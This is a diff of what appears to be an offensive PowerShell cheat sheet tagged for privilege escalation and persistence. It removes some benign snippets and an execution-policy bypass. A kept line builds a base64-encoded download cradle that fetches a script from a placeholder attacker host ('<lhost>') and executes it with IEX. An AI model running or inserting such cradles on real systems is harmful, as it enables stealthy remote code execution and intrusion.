@@ -3,20 +3,9 @@
 #plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 
 
 
-## background process
-```powershell
-$bg_args="<bg_binary_args>".split(" "); Start-Job -Name <job_name> -ScriptBlock {Start-Process <bg_binary> -ArgumentList $bg_args} 
-```
-
-
 ## Get file in trash
 ```powershell
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
-```
-
-## Get process
-```powershell
-Get-Process
 ```
 
 ## Get Proxy
@@ -131,13 +120,3 @@ $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curren
 pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
 ```
 
-
-## powershell - get execution policy
-```powershell
-Get-ExecutionPolicy
-```
-
-## powershell - set execution policy
-```powershell
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
-```
